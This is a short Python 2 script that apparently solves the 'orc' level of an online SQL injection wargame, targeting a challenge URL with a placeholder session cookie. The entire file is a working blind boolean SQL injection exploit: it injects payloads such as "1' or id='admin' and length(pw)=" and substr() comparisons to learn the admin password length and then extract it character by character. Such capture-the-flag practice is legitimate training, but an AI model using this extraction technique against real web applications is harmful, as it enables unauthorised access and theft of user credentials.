#!/usr/bin/env python
import urllib2
import urllib
import requests

flag = ""
length = 0

url = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="
session = dict(PHPSESSID = "너님의 소오중한 쿸키")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 20):
   try:
      query = url + "1' or id='admin' and length(pw)=" + str(i) + "%23"
      r = requests.post(query, cookies=session)
   except:
      print "[-] Error occur"
      continue

   if 'Hello admin' in r.text:
      length = i
      break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
   for i in range(48, 128):
      try:
         query = url + "1' or id='admin' and substr(pw, " + str(j) + ", 1)='" + chr(i)
         r = requests.post(query, cookies=session)
      except:
         print "[-] Error occur"
         continue

      if 'Hello admin' in r.text:
         flag += chr(i)
         print "[+] Found " + str(j), ":", flag
         break

print "[+] Found password : ", flag
print "[+] End"
